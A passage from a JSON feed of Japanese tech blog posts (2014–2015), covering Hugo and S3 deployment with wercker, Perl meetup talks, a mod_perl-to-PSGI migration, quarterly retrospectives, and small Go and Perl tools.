bucket を作成、site の hosting を有効にして index document:index.html にしておく作成した bucket に deploy するための IAM アカウントを作成するdeploy できる権限の policy を作成する作成した IAM アカウントに作成した deploy 用 policy をアタッチするとなります。ちなみに IAM でアカウントを作成した際に ID と SECRET が発行されますが、これは wercker に設定するので控えておきます（後ほどでも ID/SECRET は発行できます）。DNSS3 で bucket を作成すると endpoint が表示されるのでそちらに向け先を変えておく。仕上げここまでが下準備となります。ここからは準備したものを流れに沿って設定していきます。werckerApplication > Setting > Environment variablesより、wercker.yml で使う環境変数を設定します。KEY,SECRET は AWS の IAM アカウント作成時に発行した ID/SECRET を入れます。次は Deploy targets を設定します。HerokuやOpenShiftであれば API Key や Token を入れるだけでよしなに Deploy してくれるようですが、それ以外の場合は yml にて Deploy の step でどうにかする感じです。Build が成功すると「Deploy to」というのが出てきて deploy 先を選択しないと deploy されないので target 名と branch を入れて deploy 先を作っておく。後はリポジトリに md ファイルを push してやれば自動で blog に投稿できる！！！！！という算段です。AWS S3を使用したのですが、最終的にはGoogle Cloud Storageに移行したいので GCS 用 step 作ろうかとは思ってます。","link":"https://blog.jigyakkuma.org/2015/08/06/hugo_wercker_s3/","isoDate":"2015-08-06T00:10:22.000Z","dateMiliSeconds":1438819822000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"#kichijojipm 吉祥寺.pmでLTしてきた","contentSnippet":"吉祥寺.pm (kichijojipm) #4 : ATNDatnd.org今回はPerlとPerl以外ということで、Perlの外の世界をつないでるもので一番最初に思いついたのがテンプレートエンジンだったので今回の発表になりました。自分のテンプレートの利用シーンは設定ファイルの自動生成ですね。テンプレートがあることで手作業で設定ファイルをいじる必要が基本的にはないので、手作業に起因ミスがないのが良いですよね。そのほかくりかえしの記述が必要なものもテンプレート使うと便利な場面が多いと思います。前回のLTが長すぎたので、真姫進行で行ったら、巻きすぎてしまいました。時間配分難しい。#kichijojipm 真姫すぎた。。— masasuzu? (@masasuz) July 10, 2015#kichijojipm 巻きすぎた。。— masasuzu? (@masasuz) July 10, 2015懇親会のお店はおしゃれな感じでさすが吉祥寺という感じでした。五反田とは違う。#kichijojipm 炙りマカレル pic.twitter.com/wpJTTnIvZF— masasuzu? (@masasuz) July 10, 2015他の人のスライドはこちらページからたどれると思います。吉祥寺.pm4終わりました - kichijojipm’s blogkichijojipm.hatenablog.com今回の吉祥寺.pmも楽しかったです。次回も参加したいです。余談1今回のKeynoteはAzusa Colorsを元にスライドを作りました。だいぶ良い感じにできました。ありがたいです。茜屋さんのイメージカラーのパープルを基調にしています。http://memo.sanographix.net/post/113681262780memo.sanographix.net余談2LTの途中で宣伝してましたが、五反田のモバイルファクトリーさんで7/31にCrystalの勉強会やるしいですよ。東京 Crystal 勉強会 #1 in 五反田 (2015/07/31 19:30〜)crystal.connpass.comGotandaは今技術的に熱い街です。そのほかGotanda.pmや五反田Perlみたいな勉強会も様々行われてます。","link":"https://blog.masasuzu.net/entry/2015/07/12/122011","isoDate":"2015-07-12T03:20:11.000Z","dateMiliSeconds":1436671211000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"gyagoyle という Gyazo クライアント作りました","contentSnippet":"gyagoyle 〜 Gyazo client for linux 〜必要に駆られたので作ってみました。jigyakkuma/gyagoyle本家のクライアントツールが Ruby で用意されていたのと、会社で使っている社内 Gyazo のクライアント用によしなに設定したかった(Basic 認証もかかっている関係)ので作りました。mattnさんがすでに同名で作成されてたのでちょっと困りましたね…おぞましい石像に進化した」という感じです。機能はGyazo-for-Linuxを参考にひと通り実装しております(したつもり)。go get で取ってきて実行すれば gyazo.com に upload できるように作ってあるので通常用途でも問題なく使えるようにしました。まだまだ go の書き方や機能部分でイケてないところもあるかと思いますのでご指南いただけますと非常に嬉しく思います。これからもどんどんgo書くぞー","link":"https://blog.jigyakkuma.org/2015/07/09/gyagoyle/","isoDate":"2015-07-08T15:08:31.000Z","dateMiliSeconds":1436368111000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"2015年第二 四半期をふりかえる","contentSnippet":"7月にとうとうなりました。ざっくりふり返ります。お仕事mod_perl to PSGI/Plackこの四半期のメインタスクでした。弊社2事業部あるんですが、そのうちの片方の事業部のmod_perlアプリをPSGI/Plack化しました。後は事業部の人がちゃんとテストして、本番反映するだけです。もう一個の事業部のmod_perlアプリケーションは次の四半期に取りかかる予定です。雑感としては、mod_perl特有の機能はほぼ使ってないので、そんなに辛くは無かったです。どちらかというと、使っているモジュールが古すぎたり、SledgeのPlugin地獄だったりしてアプリの実装の方でちょこちょこはまることが多かったです。このあたりの話です。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前に僕らの道があるmasasuzu.hatenablog.jpGitbucket地味にアップデートが出る度に追従してました。しかしながら、そこそこでかいレポジトリをGitbucketで管理するのはだいぶつらいことが見えてきました。まず、レポジトリブラウザが鬼のように重い。1日数10コミットするようなレポジトリだとまともに使えないので、ちょっと移行先を考えてます。Elasticsearch  + Kibana4Kibana4入れました。Kibana3もまだ稼働中ですが、Kibana4で十分かなという気分です。Kibana4はすごい便利なので、そのあたりの話もどこかで一度したいです。開発環境の改善OrePAN2::Serverを廃止して、社内モジュールは静的サーバ置いたり、一つサーバでマルチユーザが同居するようなレガシーな開発環境の改善とかもろもろやってました。この辺もあとでエントリ書きたいところ。新卒技術者のメンタリング新卒技術者に対して仕事外で困ってる事とかのお悩みの相談乗ったり、成長を促すお手伝いをしたいたりします。会社としてもメンター制度できたばっかりで、組織的にも自分的にもいろいろ手探り感があるのは確かです。自分が見ている人はかなり優秀で日々成長が見て取れるので、そこをさらに促せるようにしていけたらと思います。書いた記事こう見るとあまりエントリ残してないですね。もう少し書きたいところ。4月勉強会#kichijojipm 吉祥寺.pm #3 に参加してきました。 - 目の前に僕らの道がある技術ubuntu12.04でruby2.2.1のビルド失敗するのはlibffi-devが入ってないから - ふり返る暇なんて無いね$PATHを見やすく表示したい - ふり返る暇なんて無いね5月技術ポートが空いてるか調べたいとき - ふり返る暇なんて無いねサーバ起動時に/etc/init.d/ に設定があるデーモンを自動起動したい - ふり返る暇なんて無いねElasticsearchを1.4以上に上げたらkibana3がElasticsearchにConnection Failedする際の対処 - ふり返る暇なんて無いねポエム縮退運用という考え方 - ふり返る暇なんて無いねあなたは嫌いですか。でも僕は好きです。 - ふり返る暇なんて無いね6月勉強会#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました - 目の前に僕らの道がある技術MySQLのLINEAR KEY パーティションでPKで検索しても遅い場合 - ふり返る暇なんて無いねPerlモジュールのバージョン比較したい - ふり返る暇なんて無いねポエム普段の行動がものをいう - ふり返る暇なんて無いね判断と判断の変更 - ふり返る暇なんて無いね感覚値はあくまで感覚値 - ふり返る暇なんて無いね次の四半期お仕事的にはもう一個の事業部のPSGI/Plack化と開発環境の改善をメインにやってくと思います。ここ最近ちょっといろいろ腹に貯めすぎなので、もう少し心にゆとりをもっていけたらなとは思いまする。","link":"https://blog.masasuzu.net/entry/2015/07/03/2015_2_retrospective","isoDate":"2015-07-03T00:00:00.000Z","dateMiliSeconds":1435881600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"他社の障害対応きにならNight! に行ってきた","contentSnippet":"エンジニア交流会〜他社の障害対応きにならNight!〜 on Zusaarwww.zusaar.com一昨日の話ですが、Gaiaxさんに行ってきました。内容に関してはけっこうグレーな感じなこともあるので、話せないのですが、あー、あるよねー。とか だいぶつらい。。。って話を聞けて楽しかったです。他山の石にしたいです。インシデント管理に関してはちょっと痛いところがあるので見直したいなと思いました。懇親会で深い話が聞けていろいろ学びがありました。すごい楽しかったので次回もあれば参加したいです。寿司 pic.twitter.com/RnLrH5mxlp— masasuzu? (@masasuz) June 30, 2015内容言えないけどすごい為になってる— masasuzu? (@masasuz) June 30, 2015だいぶつらい話聞いてるもの— masasuzu? (@masasuz) June 30, 2015炎上案件だ。。。— masasuzu? (@masasuz) June 30, 2015インシデント管理に関してはちょっと痛いところあるなと思った。— masasuzu? (@masasuz) June 30, 2015なかなかこういう他社の障害事例聞けないので、今日は楽しかった。— masasuzu? (@masasuz) June 30, 2015innodbのデータ圧縮すると並列性が犠牲になるってのは、初耳だったのでちゃんと調べたい。— masasuzu? (@masasuz) June 30, 2015","link":"https://blog.masasuzu.net/entry/2015/07/02/134402","isoDate":"2015-07-02T04:44:02.000Z","dateMiliSeconds":1435812242000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #5 でLTの高速化に失敗しました","contentSnippet":"Gotanda.pm Perl Technology Conference #5 (2015/06/24 19:30〜)gotanda-pm.connpass.comGtanda.pmでLTしてきました。#gotandapm LTの高速化に失敗しました。— masasuzu? (@masasuz) June 24, 2015内容としてはPlack Applicationのアクセスログの話です。アクセスログそのものの話アクセスログの収集の話アクセスログの可視化/集計の話1個目の論点しか話せませんでした。猛省します。次回は事故らずに話したいです。最近Kibana4とElasticsearchを使っていてだいぶアクセスログに限らず ログ解析が捗っているので、その辺も別の機会に話せたらと思います。他の人の発表では、skajiさんの Acme::CPAN::Installerの発表がすごかったです。cpanモジュールをインストール出来るとこんなに速くなるのかと感心しました。業務で使いたいと思うくらいには速かったです。そのほかの人の発表も楽しく聞かせてもらいました。gotandapm参加者の皆さん！吉祥寺.pm4は、まだまだ参加者募集中です！https://t.co/JwGFxDOnXi#kichijojipm #gotandapm— magnoliak (@magnolia_k_) June 24, 2015どうやら吉祥寺.pm 来月開催らしいですよ。","link":"https://blog.masasuzu.net/entry/2015/06/25/184549","isoDate":"2015-06-25T09:45:49.000Z","dateMiliSeconds":1435225549000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"GitHub Pages でいっつもハマるのでメモ","contentSnippet":"ブログを github pages に置くのはいいけど、blog の theme を変えた時に repo を一掃しちゃってその度に「あれ 404 のままやん」ってなってるので自分用のメモ。custom domain のファイルを作成し、repo に commit する。echo example.com > CNAME","link":"https://blog.jigyakkuma.org/2015/06/13/gh-pages-cname/","isoDate":"2015-06-12T16:06:27.000Z","dateMiliSeconds":1434125187000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"#kichijojipm 吉祥寺.pm #3 に参加してきました。","contentSnippet":"吉祥寺.pm行ってきました。吉祥寺.pm (kichijojipm) #3 : ATNDatnd.org今回はツールチェインがテーマと言うことで、Minillaの話題が2件ほどあって、参考になりました。今回特によかったなと思ったのがpapixさんの新人研修の話でした。ガイアックスさんはここ二年くらいで新人研修を整備し始めたそうで、だいぶ充実した内容をやっていそうなので、こっそり参加したいです。#kichijojipm ガイアックスに新人研修受けに行きたい— masasuzu? (@masasuz) April 17, 2015話の中で研修資料をスライドじゃ無くてドキュメントとして残すってのが、印象に残ってます。OJTが基本なのですが、開発グループのエンジニアの有志が社内勉強会枠の時間*1で新人さんに最低限知っておいて欲しい技術基礎の勉強会を行っています。wikiに残しておいて、次年度使い回せるように + 中途の人が入ってきたときも一通り見れば分かるようにしてます。その辺、アプローチが似ているなと思います。さておき、今回も楽しかったです、上級者向けの話からperl少し書ける人でも役に立つ話まで聞けてレベル感的にも良い感じです。主催のmagnoliakさん、htk291さんありがとうございました。次回の吉祥寺.pm楽しみにしてます。吉祥寺.pm in 五反田楽しみにしてます!!!五反田で吉祥寺.pmとか。— 吉祥寺.pm (@kichijojipm) April 17, 2015参照吉祥寺.pm3終わりました - kichijojipm’s blogkichijojipm.hatenablog.com余談SSID: TMNetwork がいてふいた— masasuzu? (@masasuz) April 17, 2015*1:弊社、毎日終業定時前の1時間は勉強会の時間と会議室が確保されていて、好きにやって良いことになってる。もちろん毎日は開かれない","link":"https://blog.masasuzu.net/entry/2015/04/19/kichijoji.pm-3","isoDate":"2015-04-19T06:59:42.000Z","dateMiliSeconds":1429426782000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2015年第一四半期をふりかえる","contentSnippet":"そろそろ3月も終わりそうなので、軽くまとめてみる。お仕事Slack連携ツール昨年末から1月にかけては、社内のチャットツールをIRCからSlackに移すためにもろもろの連携ツールを書いていました。WevService::Slack::IncomingWebHookはそういう事情で書いたコードです。WebService::Slack::IncomingWebHookというモジュールを書いてCPAN Authorとやらになったようです - 目の前には僕らの道があるmasasuzu.hatenablog.jp連携ツール自体は、Irisというプロジェクトコードで、HTTPでSlackへIncoming webhookを投げたり、SlackからOutgoing webhookを受けたりするProxy的なものです。コードは公開してないです。mod_perl to PSGI/Plack2月3月はmod_perlなプロジェクトをPSGI/Plack+Carton化をひたすらしていた感じです。このタスク自体は半期で終わらす予定なので、次の四半期も継続案件です。前回のGotanda.pmで話した件ですね。#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前には僕らの道があるmasasuzu.hatenablog.jp書いた記事1月H2データベースの話はGitbucketのDBの調子が悪くていったんデータをダンプしてDBファイルを作り直さなきゃいけなかった時の話のハズ。2014年に使った技術 - 目の前には僕らの道があるsudo -Hと環境変数($PATH)ではまった話 - ふり返る暇なんて無いねH2データベースのダンプ、リストアをする - ふり返る暇なんて無いね#chibapm Chiba.pm #6 に参加してきた - 目の前には僕らの道がある2月tmuxでwindow番号を変更したい - ふり返る暇なんて無いねperl5.16から overloadが\\"overload arg \'\\"\' is invalid \\"みたいなwarningを吐き出した - ふり返る暇なんて無いね情報共有に関してもやもや思ってること - ふり返る暇なんて無いね3月3月はちょっと古めのコードをいろいろいじっててはまっていたらしいですね。Perl 5.18からsmart matchはexperimentalなので使わないで - ふり返る暇なんて無いねとあるプロジェクトのコードのあんちぱたーん - ふり返る暇なんて無いねDebian Packageのバージョンを比較したい。 - ふり返る暇なんて無いね開発二部でLTしてきた #でぶつー - 目の前には僕らの道があるFurl::S3でSSL接続エラーが出る件 - ふり返る暇なんて無いね#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話 - 目の前には僕らの道がある設定と処理をわけるということ - ふり返る暇なんて無いねUbuntu 12.04で/tmpがおかしくてうまく起動しなかった件 - ふり返る暇なんて無いね次の四半期お仕事的には引き続きmod_perlを無くしていく作業を続けていると思います。お仕事外で現状これといってやりたいことはないんですが、最近仕事外のコードをあまり書いてないので、その辺少し改善できたらなとは思いまする。","link":"https://blog.masasuzu.net/entry/2015/03/30/2015_1_retrospective","isoDate":"2015-03-30T01:00:00.000Z","dateMiliSeconds":1427677200000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"#gotandapm Gotanda.pm Perl Technology Conference #4 話してきた話","contentSnippet":"Gotanda.pm Perl Technology Conference #4 (2015/03/25 19:30〜)gotanda-pm.connpass.comだいぶ昔のmod_perlで動いているプロジェクトをPSGI/Plack化するために現在進行形で作業してるよという話です。直前に書き上げてリハーサル全くしないまま本番で話したので、全然時間が足りなかったです。#gotandapm つらいしか言わずに終わってしまった— masasuzu? (@masasuz) March 25, 2015さて、古いmod_perlなプロジェクトも新しめのプロジェクトと同じスキームに載せて動くように現在進行形で動いているところです。それはそれとして大人のGotanda.pmも面白そうですね。とはいえ、ソンナニ闇ハカカエテナイデスヨ。全然。大人のGotanda.pmとかやって, GXやMFのインフラ部署の人に闇語ってもらいたい #gotandapm— パブリシティ権放棄型 (@__papix__) March 25, 2015ちなみに、新しめのプロジェクトで使っているスキームはそういえば、Gotanda.pm #1で話したくらいに作っていたようです。#gotandapm Gotanda.pm Perl Technology Conference #1に参加した LTした - 目の前には僕らの道があるmasasuzu.hatenablog.jp会場をお貸しいただいたGaiaxさんありがとうございました。運営のみなさんもお疲れ様でした。ありがとうございました。Gotanda.pmお疲れ様でした. 会場やUstreamは如何でしたでしょうか. 今回のように, 弊社セミナールームは勉強会会場として貸し出す事も出来ますので, 使ってみたいという方は @__papix__ までご連絡下さい. #gotandapm— パブリシティ権放棄型 (@__papix__) March 25, 2015蛇足ですが、Gaiaxさんのすぐ近くの麺彩房の油そば好きです。五反田ぴーえむ pic.twitter.com/6UBO7Y6fDi— masasuzu? (@masasuz) March 25, 2015","link":"https://blog.masasuzu.net/entry/2015/03/26/gotanda.pm_4","isoDate":"2015-03-26T13:38:13.000Z","dateMiliSeconds":1427377093000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"開発二部でLTしてきた #でぶつー","contentSnippet":"開発二部という社内の部活でLTをしてきました。最近古めのプロジェクトを多少モダンにするタスクをしてるので、そのあたりで得た知見を書いてます。特に何かを批判したいわけではなく、こういうのはよくないから、新しいプロジェクトではこういうことは避けると幸せになりやすいよと言いたいだけです。よくないコードは直すだけです。ただdisって何もしないのはよくないですし、そういうことをしたいわけではないです。","link":"https://blog.masasuzu.net/entry/2015/03/17/220240","isoDate":"2015-03-17T13:02:40.000Z","dateMiliSeconds":1426597360000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"旅する勉強会 tech.kayac meetup #0 に登壇しました","contentSnippet":"皆様、いかがお過ごしでしょうか。そういえば先日こんな勉強会で登壇させていただく機会がございました。旅する勉強会 tech.kayac meetup #0まずは会場まで足を運んでいただきました来場者の方々に深くお礼申し上げます。普段、表立つことが少ない立ち位置なのですが、部署やジャンルをごちゃ混ぜでやるにあたって GoogleApps を取り上げてみてもいいのでは？ということで今回チャンスをいただきました。このテーマ、みんな興味もってくれる？会社の名前を背負った勉強会は集まる層がちょっと違う？せっかく足を運んでいただいたのにガッカリさせないか？など、企画時にお題は決めたものの内容で苦悩してました。そもそも勉強会って興味あるテーマ以外の話もけっこうある知らないジャンルだからこそためになる、知見が広がるセッション自体が面白いと満足度はあがると、お邪魔させていただいた勉強会を思い出してたら吹っ切れたので、要所にネタのエッセンスを入れつつ、楽しくトークさせていただきました。資料自体のサンプルが少ないというのもあるので、せめてデモをやって GoogleAppsScript の動作などを見ていただけたらよかったのですが、1 人でトークが弾んじゃってデモをする時間がなかったというのが心残りでした。あとはハッシュタグの Tweet でこの人何人殺してんだろw #techkayac— Daisuke Murase (@typester) February 25, 2015管理部門に優しくしないと殺られる、という知見が得られた #techkayac— Daisuke Murase (@typester) February 25, 2015と、誤解を招く内容がありましたが、私は至って温和です。安心してください、大丈夫ですので。最後に個人的な感想を述べさせていただくとやっぱり人前で話すのは刺激受けるし刺激を与えられるからいい社内外問わずわいわいやるの楽しい今後もわいわいしていきたいし、わいわいしてる人を増やしたいといったところでしょうか。せっかくやるからには楽しんでもらいたいし、気持ちよく終わりたい、というのは心がけたつもりなので次回以降もご参加いただける皆様に少しでもおもてなしできればと思います。以下当日の資料となります。セッションの内容はこれが全てではないですが、なんとなく雰囲気を感じていただければと思います。","link":"https://blog.jigyakkuma.org/2015/02/27/tabisuru00/","isoDate":"2015-02-27T14:18:50.000Z","dateMiliSeconds":1425046730000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"blog を octopress から Hugo に乗り換えたメモ","contentSnippet":"今まで blog は octopress で書いてたのですが、先日ひさしぶりに「おっしゃ！書くか！」ってなって octopress コマンド叩いたらエラー出てて「めんどくせええぇぇぇぇーーーー!!!1」ってなってたらdeeeetさんのOctopuses から Hugo へ移行したをナイスなタイミングで読んだので便乗して Hugo に乗り換えてみました。使い方はHugoのDocsに丁寧にかかれているのでオススメです。やったこととしては・ Theme の選定とカスタマイズTheme の選定hugoThemesに Theme が用意されている。Theme を作れるほどのスキルはなかったのでこの中からチョイスしてカスタマイズすることにしました。日に日に Theme が増えているようなのでこまめにチェックするといいかもしれないです。また、Theme の preview サイトが coming soon となっているので待ち遠しいですね。Theme のカスタマイズとりあえず Theme をいろいろ見てみてlanyonがよさげだったのでとりあえずこれをベースにカスタマイズしました。といっても sidebar の項目をメンテしたりsharebuttonを突っ込んだりしたくらいです。config.toml の作成Hugo はtomlが使えるということだったので config ファイルは toml にしてみました。参考までに使用している現在の config.toml は以下となります。contentdir = \\"content\\"layoutdir = \\"layouts\\"publishdir = \\"public\\"baseurl = \\"https://blog.jigyakkuma.org\\"[indexes]  category = \\"categories\\"  tag = \\"tags\\"[params]  Title = \\"俺よりイケてないエンジニアはいない\\"  description = \\"jigyakkuma\'s blog\\"  DateForm = \\"Jan 02 , 2006\\"  languageCode = \\"ja\\"  countryCode = \\"ja\\"[permalinks]    post = \\"/:year/:month/:day/:filename/\\"[params.Twitter]  Account = \\"@jigyakkuma_\\"  Url = \\"https://twitter.com/jigyakkuma_\\"[params.Github]  Url = \\"https://github.com/jigyakkuma\\"  UserName = \\"jigyakkuma\\"こんな感じでパラメータを定義しておいて{{ .Site.Params.Twitter.Account }}で layout 用の html に突っ込んどくと使えます。感想最初は便乗して乗り換えてみるか！くらいの感じでしたが、Hugo が Go で実装されているというところもあって Go の環境があれば go get してすぐに使い始められるのは個人的には楽でした。ディレクトリ構成もシンプルなのでわかりやすくて good。$ tree -L 1.├── archetypes├── config.toml├── content├── layouts├── public└── staticpublic 内のファイルをサーバに置けば(この blog は github pages)公開されますが、どこにどういう風に deploy するかでやり方が様々なので導入の際は事前に考えておいたほうがよさそうです。まだまだ発展途上で、どう進化していくのか楽しみなのでもう少し使い込んでみたいと思います。","link":"https://blog.jigyakkuma.org/2015/02/11/hugo/","isoDate":"2015-02-11T01:42:57.000Z","dateMiliSeconds":1423618977000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"#chibapm Chiba.pm #6 に参加してきた","contentSnippet":"行ってきました。Chiba.pm #6 : ATNDChiba.pm #6 : ATNDCPAN Authorになったのでその辺の話をLTしてきました。前にエントリを書いた話です。Minilla便利でした。Chiba.pmなのにPerlの話をしてすみませんでした。。。。久しぶりのChiba.pm楽しかったです。マグロ美味しかったです。次回も楽しみです。過去のchiba.pm#chibapm Chiba.pm #5 でログ回りのことを聞きたかった - 目の前には僕らの道があるchiba.pm 2回目に行ってきた #chibapm - 目の前には僕らの道がある#chibapm #1に行ってきた。 - 目の前には僕らの道がある","link":"https://blog.masasuzu.net/entry/2015/01/28/chiba.pm_6","isoDate":"2015-01-28T09:15:39.000Z","dateMiliSeconds":1422436539000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2014年に使った技術","contentSnippet":"ざっくりと去年使った技術をざっくりふりかえってみる。ホントにざっくりです。PSGI/Plack今働いている会社のwebサービスのバックエンドはperlで動いています。そしてそれらのアプリケーションはmod_perl上で動くようになっていました。*1があってそろそろmod_perl卒業したいよねと検証自体は重ねていたんですが、年初くらいに都合よくほかのサービスに影響を与えることのない小規模な新規プロジェクト*2を作ることになりました。もの自体は1週間くらいでくみ上げました。ここで組んだベースアーキテクチャが以降のPSGI/Plackのプロジェクトのベースになっています。Perl::Build / xbuildtagomoris/xbuild \xb7 GitHubPerl::Build - perl builder - metacpan.orgperlに依存するとディストリビューションやOSを変える度にperlのバージョンが変わっていろいろ面倒なので、PSGI/Plack化したプロジェクトではperlを独自にビルドするようにしてます。perl-buildでビルドしたperlをdebian package化して使っています。各サーバでperlをビルドするのは時間の無駄遣いなのでdebで配布します。CartonCarton - Perl module dependency manager (aka Bundler for Perl) - metacpan.orgsystem perlを使っていたときは、perl moduleもdebian packageで入れていたんですが、独自ビルドするようになったので、モジュール管理にcartonを使ってます。OrePAN2::ServerOrePAN2::Server - DarkPAN Server - metacpan.org基本社内モジュールは作らない/作らせない/CPANに上げやがれという方針ですが、どうしても外には出せない社内ロジックがあるのでそういうものを置く場所として使っています。UpstartUbuntuで動いているサービスのデーモン管理はupstartに基本任せています。設定ファイル書くの簡単で、癖がそんなにないので重宝しているんですが、なんか次のUbuntuからsystemdに移行するみたいな話があってだいぶ辛い予感がしてます。FluentdFluentdを全サーバに導入しました。今まで各サーバに入ってgrep/wc/sed/tailを駆使してログ解析していたアプリケーションログ(イベントログ)、アクセスログ、エラーログを1つの場所に集約できるようになってだいぶ捗ってます。アクセスログに関しては最終的にvhost毎と vhostとstatus code(4xx,5xxxのみ)毎にファイルを分けて出力するようにしてるので、アクセスログ解析が今までよりだいぶ捗るようになりました。だいぶライフチェンジングです。Elasticsearch / KibanaFluentd入れた時点でだいぶログ回りは快適になったんですが、それでも最終的なログのストア先はファイル*3なのでアプリから扱うには少し不便とか諸事情あったので、いろいろ検証した上でElasticsearchを入れました。GitBuckettakezoe/gitbucket \xb7 GitHubgitレポジトリへのアクセスは基本sshを使っていたんですが、開発者以外の企画者やデザイナもgitを使うようになってきて、いろいろアカウント管理の問題が出てきて素のままgit使うのはちょっと管理上つらいというのがきっかけでその辺解消するために導入したのがgithub cloneのGitBucketでした。レポジトリブラウザとしてよいのですが、歴史が深いレポジトリとかだとだいぶ重かったりするのが少し難点です。Slack試験導入中です。正直別にIRCでもよくね?感がまだあります。デフォルトでwebから見れるという点は便利なような気がしなくもないです。なんかほかにもやったような気がしますが、去年はざっくりこんなことしていたらしいです。*1:system perlにはもう依存したくないよねとかいろいろ。察してください*2:ちなみにStartDash(START:DASH!!)というプロジェクトコードを付けていた。察してください*3:一定ファイル容量でローテートされる。そしてgzip圧縮してるのとしてないの(バッファ)が混じってる","link":"https://blog.masasuzu.net/entry/2015/01/04/142926","isoDate":"2015-01-04T05:29:26.000Z","dateMiliSeconds":1420349366000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"2014年の自分が書いた技術エントリふりかえり","contentSnippet":"書いたエントリのリンクを貼り付けるだけの雑なふりかえりです。一応自分の技術ブログが2つあって、ここが勉強会のエントリや、わりかしまとまった技術に関して書くところ。もうひとつ(ふり返る暇なんて無いね)の方がゆるふわにメモやポエムを書いていく方。1月PERL_CARTON_MIRRORをOrePAN2::Serverに向けてcarton installすると怒られる - ふり返る暇なんて無いね2月この時期なにやっていたっけ?全く記憶に無い3月hostnameコマンドメモ - ふり返る暇なんて無いねfluent-plugin-forestを使いつつ、tag_partsが複数あるときにpathにtag_partsを含めたときに、same buffer_pathを使っていると怒られる。 - ふり返る暇なんて無いねエンジニアでもターミナル作業ログを残したい!! - 目の前には僕らの道がある4月プロセスが開いているファイルディスクリプタ数を知りたい - ふり返る暇なんて無いねプロセスがオープン可能なファイルディスクリプタを知りたい - ふり返る暇なんて無いねUbuntu12.04のapproxはinetd経由で立ち上がる件 - ふり返る暇なんて無いねLINE Developer Conference(テーマ：インフラ)にいってきたメモ - 目の前には僕らの道がある5月carton installするたびにcpanfile.snapshotが更新されるのがうざったい - ふり返る暇なんて無いね6月キャッシュ(しない)戦略 - ふり返る暇なんて無いね溜まるジョブキュー - ふり返る暇なんて無いねinnodb_log_file_sizeを気軽に変えると死ぬよ - ふり返る暇なんて無いね監視の閾値の考え方1 - ふり返る暇なんて無いねこのあたりはポエムを書きたいお年頃だったようだ。#五反田Perl でもくもくしてきた。perlのコードはほとんど書いてない。 - 目の前には僕らの道がある#gotandapm Gotanda.pm Perl Technology Conference #1に参加した LTした - 目の前には僕らの道がある五反田が熱くなり始めたのもこの頃。7月コマンドの出力結果の一時ファイルを作りたくなったら、プロセス置換を思い出すと良いかも知れない - ふり返る暇なんて無いね8月#でぶつー 五反田もくもく会 #1 に行ってきた - 目の前には僕らの道があるマニュアルオペレーションするとき気を付けたいこといくつか - ふり返る暇なんて無いね-で始まるファイルを消す方法 - ふり返る暇なんて無いねUbuntu 12.04でGitBucketを使うメモ - ふり返る暇なんて無いね#yapcasia YAPC::Asia前夜祭でインスピレーションを得てきた - ふり返る暇なんて無いね8月末はYAPC Asiaでした。今年もスタッフやってました。9月#yapcasia YAPC::Asia 2014でボランティアスタッフやってきました - 目の前には僕らの道がある#gotandago Gotanda.go #1 行ってきた - 目の前には僕らの道があるエイリアスを使わないでコマンド実行するいくつかの方法 - 目の前には僕らの道がある#gotandapm Gotanda.pm Perl Technology Conference #2 に行ってきた - 目の前には僕らの道があるgolangに興味を持ち始めたのはこの頃、来年こそはちゃんと使えるようにしたい。10月boot2dockerでexposeされるportはlocalhostのportじゃないよ - ふり返る暇なんて無いね#chibapm Chiba.pm #5 でログ回りのことを聞きたかった - 目の前には僕らの道があるこの時期、Elasticsearchまわりでいろいろはまってたはずなのに一切アウトプットが無いな。。。。11月不思議な時間にlogrotateしているその理由は。 - ふり返る暇なんて無いねconnectがhomebrewで入らなくなったので自前でビルドする - ふり返る暇なんて無いね#perlcasual PerlCasual #06 行ってきた(だいぶ昔の話 - 目の前には僕らの道がある#kichijojipm 吉祥寺.pm #1 に行ってきました (だいぶ昔の話 - 目の前には僕らの道がある12月WebService::Slack::IncomingWebHookというモジュールを書いてCPAN Authorとやらになったようです - 目の前には僕らの道があるねんがんのCPAN Authorになったぞ!こう見てみると、今年もアウトプット量が足りないなという印象。実際業務でいろいろはまっていたはずなのに、そのことがまったく書かれてないので、もう少しメモ書きレベルでもいいので残していきたい。というのが来年の課題。ソースコードでのアウトプットももっとがんばらないと。良いお年をー。","link":"https://blog.masasuzu.net/entry/2014/12/29/2014_retrospective","isoDate":"2014-12-29T07:27:23.000Z","dateMiliSeconds":1419838043000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"WebService::Slack::IncomingWebHookというモジュールを書いてCPAN Authorとやらになったようです","contentSnippet":"WebService-Slack-IncomingWebHook-0.01 - slack incoming webhook client - metacpan.orgWebService-Slack-IncomingWebHook-0.01 - slack incoming webhook client - metacpan.orgはい。Web Hookを使ってSlackに投稿をポストしてくれる君です。post-slackというコマンドを同梱していてコマンドラインからも使えるようになってます。当初Net::Slackという名前を使っていたんですが、どうやらNetという名前空間はネットワークプロトコルを喋るモジュールが使うところで、webサービスのAPIを叩くようなものはWWWかWebServiceを使うらしいので、避けました。また、Slack APIが別にあるので、Slack単体名だとSlack API叩くように誤解されるのでさらに一段名前空間を斬ってます。スクレイピングしてる系という印象[要出典]があったので。WWWは避けた。参考: PAUSE: pause_namingmodules Netの項目そんな感じで CPAN 